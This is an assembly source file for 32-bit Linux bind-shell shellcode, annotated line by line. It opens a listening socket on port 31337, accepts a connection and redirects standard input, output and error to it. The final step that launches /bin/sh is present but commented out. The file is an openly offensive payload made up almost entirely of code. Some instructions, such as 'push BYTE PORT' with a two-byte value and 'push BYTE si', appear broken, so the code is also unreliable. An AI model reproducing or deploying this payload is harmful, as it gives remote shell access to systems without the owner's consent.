[BITS 32]

;!!!
%define PORT 0x697a  			; (31337 in reverse)
;!!!

; System calls
%define SYS_SOCKETCALL 0x66
%define SYS_DUP2 0x3f
%define SYS_EXECVE 0x0b

%define SYS_SOCKET 0x01
%define SYS_BIND 0x02
%define SYS_LISTEN 0x04
%define SYS_ACCEPT 0x05


%define PF_INET 0x02
%define SOCK_STREAM 0x01





	; s = socket(PF_INET, SOCK_STREAM, 0)
	push BYTE SYS_SOCKETCALL
	pop eax				; Set eax to SYS_SOCKETCALL
	xor ebx, ebx			; Set edx = 0
	add bl, SYS_SOCKET		; Set ebx = 1
	xor edx, edx			; set edx = 0

	push edx			; 3. argument: 0 (Protocol family)
	push BYTE 0x01			; 2. argument: 1 (SOCK_STREAM)
	push BYTE 0x02			; 1. argument: 2 (AF_INET)
	
	mov ecx, esp			; ecx = pointer to arguments
	int 0x80			; SYSCALL(int call, *args) 
					;=SYSCALL(ebx, ecx)


	mov esi, eax			; Save socket for later
	

	; bind(socket, *args, 16)
	; bind(s, [2, 31337, 0] 16)
	push BYTE SYS_SOCKETCALL
	pop eax				; eax = SYS_SOCKETCALL
	mov bl, SYS_BIND		; ebx = SYS_BIND. Note that this assumes every byte of ebx
					; except lowest bytes are 0!
	
	push edx			; 3. argument: 0
	push BYTE PORT			; 2. arguemtn: PORT
	push BYTE 0x02			; 1. argument: 2
	mov ecx, esp			; eax = pointer to arguments

	push BYTE 0x10			; 3. argument: 16
	push ecx			; 2. argument: (previous argument array)
	push esi			; 1. argument: socket
	
	mov ecx, esp			; ecx = pointer to array (s,[2,PORT,0],16)
	int 0x80			; Call kernel


	; Listen(int s, int backlog)
	; Listen(s,4)
	push BYTE SYS_SOCKETCALL
	pop eax
	mov bl, SYS_LISTEN 		; ebx = SYS_LISTEN
	push BYTE 0x04			; 2. argument: 4 			
	push BYTE si			; 1. argument: socket
	mov ecx, esp			; ecx = pointer to argument array
	int 0x80			; call kernel
	

	; c = accept(s, 0, 0)
	mov al, SYS_SOCKETCALL		; eax = SYS_SOCKETCALL
	mov bl, SYS_ACCEPT		; ebx = SYS_ACCEPT
	push edx			; 3. argument: 0
	push edx			; 2. argument: 0
	push esi			; 1. argument: s
	mov ecx, esp			; ecx = arguments
	int 0x80
	

	; dup2(connected socket, {})
	mov ebx, eax			; ebx = accepted socket
	push BYTE SYS_DUP2	
	pop eax				; eax = SYS_DUP2
	xor ecx, ecx			; ecx = 0 = STDIN
	int 0x80			; dup(c,0)
	
	mov BYTE al, SYS_DUP2	
	add cl, 0x01			; ecx = 1 = STDOUT
	int 0x80			; dup(c,1)
	
	mov BYTE al, SYS_DUP2
	inc ecx				; ecx = 2 = STDERR
	int 0x80			; dup(c,2)
	
	
	; execve(char *filename,char *argv[], char *envp[])
	; execve("/bin//sh", ["/bin//sh", NULL], NULL)
;	mov BYTE al, SYS_EXECVE
;	push edx			; pushed "/bin//sh" to stack
;	push "//sh"			; ---
;	push "/bin" 			; ---
;	mov ebx, esp			; ebx = pointer to "/bin//sh", 1. arg
;	push edx			; push NULL
;	mov edx, esp			; edx = pointer to NULL, 2 ARG
;	push ebx			; 			
;	mov ecx, esp
;	int 0x80			; execve(...)

	
	
	
	
	
	
	














	
	
	
	
























